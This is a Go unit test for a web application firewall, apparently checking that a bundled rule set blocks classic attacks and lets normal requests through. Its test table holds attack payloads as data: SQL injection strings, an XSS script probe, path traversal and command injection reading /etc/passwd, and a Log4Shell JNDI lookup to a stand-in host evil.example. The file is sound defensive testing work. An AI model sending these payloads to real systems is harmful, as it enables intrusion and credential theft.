package waf

import (
	"net/http/httptest"
	"strings"
	"testing"
)

// TestCRSBaseline pins what the bundled CRS must do after every version bump:
// block the classic attack families and let ordinary traffic through. A CRS
// release that changes either side fails here before it ships.
func TestCRSBaseline(t *testing.T) {
	e := newTestEngine(t)
	cases := []struct {
		name, method, target, ctype, body string
		blocked                           bool
	}{
		{"sqli query", "GET", "/item?id=1%27%20OR%20%271%27%3D%271", "", "", true},
		{"xss query", "GET", "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "", "", true},
		{"path traversal", "GET", "/download?file=../../../../etc/passwd", "", "", true},
		{"rce query", "GET", "/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd", "", "", true},
		{"log4shell", "GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "", "", true},
		{"sqli form", "POST", "/login", "application/x-www-form-urlencoded", "user=admin'--&pass=x", true},
		{"sqli json", "POST", "/api/users", "application/json", `{"id":"1 UNION SELECT password FROM users"}`, true},

		{"home page", "GET", "/", "", "", false},
		{"static asset", "GET", "/assets/app.3f9a1c.js", "", "", false},
		{"search with apostrophe", "GET", "/search?q=O%27Reilly+books", "", "", false},
		{"pagination", "GET", "/api/items?page=2&limit=50&sort=-created_at", "", "", false},
		{"login form", "POST", "/login", "application/x-www-form-urlencoded", "email=jane%40example.com&password=Correct-Horse-9", false},
		{"json api", "POST", "/api/orders", "application/json", `{"items":[{"sku":"A-100","qty":2}],"note":"leave at door"}`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := httptest.NewRequest(tc.method, "http://app.example.com"+tc.target, strings.NewReader(tc.body))
			r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36")
			r.Header.Set("Accept", "text/html,application/json,*/*")
			r.Header.Set("Accept-Language", "en-GB,en;q=0.9")
			if tc.ctype != "" {
				r.Header.Set("Content-Type", tc.ctype)
			}
			res, err := e.Check(r, "203.0.113.9")
			if err != nil {
				t.Fatalf("check: %v", err)
			}
			if res.Blocked != tc.blocked {
				t.Errorf("blocked = %v (rule %d), want %v", res.Blocked, res.RuleID, tc.blocked)
			}
		})
	}
}
